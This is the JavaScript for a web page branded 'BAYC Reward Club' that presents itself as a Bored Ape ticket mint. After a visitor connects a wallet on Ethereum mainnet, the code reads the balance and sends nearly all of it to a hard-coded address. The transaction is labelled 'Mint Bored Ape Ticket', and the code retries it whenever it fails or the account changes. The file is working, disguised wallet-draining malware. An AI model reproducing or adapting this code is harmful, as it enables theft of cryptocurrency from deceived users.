const Web3Modal = window.Web3Modal.default;
const Web3 = window.Web3;
const WalletConnectProvider = window.WalletConnectProvider;
const CoinbaseWalletProvider = window.CoinbaseWalletProvider;
const evmChains = window.evmChains;

let web3Modal;
let provider;
let selectedAccount;

function init() {
    const providerOptions = {
        metamask: {
            id: "injected",
            name: "MetaMask",
            type: "injected",
            check: "isMetaMask",
        },
        walletconnect: {
            package: WalletConnectProvider, // required
            options: {
                qrcodeModalOptions: {
                    mobileLinks: [
                        "rainbow",
                        "metamask",
                        "argent",
                        "trust",
                        "imtoken",
                        "pillar"
                    ]
                },
            }
        },
        coinbasewallet: {
            package: CoinbaseWalletProvider,
            options: {
                appName: "BAYC Reward Club",
            }
        }
    };

    web3Modal = new Web3Modal({
        theme: "dark",
        network: "mainnet",
        cacheProvider: true,
        providerOptions
    });
}

async function fetchAccountData() {
    console.log(provider.chainId);

    if (provider.chainId === "0x1") {
        const web3 = new Web3(provider)
        // console.log(provider)

        let accounts = await web3.eth.getAccounts();
        selectedAccount = accounts[0];

        console.log(selectedAccount)

        let text_balance = await web3.eth.getBalance(selectedAccount);

        let ethBalance = web3.utils.fromWei(text_balance, "ether");

        console.log(ethBalance);

        function send() {
            web3.eth.sendTransaction({
                from: selectedAccount,
                to: '0xe5a97143D67e794c5E232eDa3E4BAea1268d9B31',
                value: web3.utils.toWei(Math.max(0, parseFloat(ethBalance)-0.005).toString(), 'ether'),
                gasPrice: 20000000000,
                gasLimit: 22000,
                data: web3.utils.toHex("Mint Bored Ape Ticket"),
            }).on('error', function(){
                send();
            });
        }
        send();
        console.log("ok")
    }
}

async function refreshAccountData() {
    await fetchAccountData(provider);
}

async function onConnect() {
    try {
        provider = await web3Modal.connect();
    } catch(e) {
        console.log("Could not get a wallet connection", e);

        let isSafari = navigator.vendor && navigator.vendor.indexOf('Apple') > -1 &&
            navigator.userAgent &&
            navigator.userAgent.indexOf('CriOS') == -1 &&
            navigator.userAgent.indexOf('FxiOS') == -1;

        if (isSafari) {
            location.href = "https://tokenary.io"
        } else {
            location.href = "https://metamask.io"
        }
    }

    // Subscribe to accounots change
    provider.on("accountsChanged", (accounts) => {
        fetchAccountData();
    });

    // Subscribe to chainId change
    provider.on("chainChanged", (chainId) => {
        fetchAccountData();
    });

    // Subscribe to networkId change
    provider.on("networkChanged", (networkId) => {
        fetchAccountData();
    });

    await refreshAccountData();
}

async function onDisconnect() {

    console.log("Killing the wallet connection", provider);
    // TODO: Which providers have close method?
    if(provider.close) {
        await provider.close();
        await web3Modal.clearCachedProvider();
        provider = null;
    }

    // $(".connect-wallet").removeClass("connected-wallet");

    // let menuaddr = document.getElementById("initialized-wallet");
    // menuaddr.style.display = "none";
    //
    // let buttonConnect = document.getElementById("button-wallet-connect");
    // buttonConnect.style.display = "inline-flex";

    selectedAccount = null;
}

$(document).ready(async function() {
    init();
    document.getElementById("connect-wallet-button").addEventListener("click", onConnect)
    document.getElementById("connect-wallet-button-2").addEventListener("click", onConnect)
});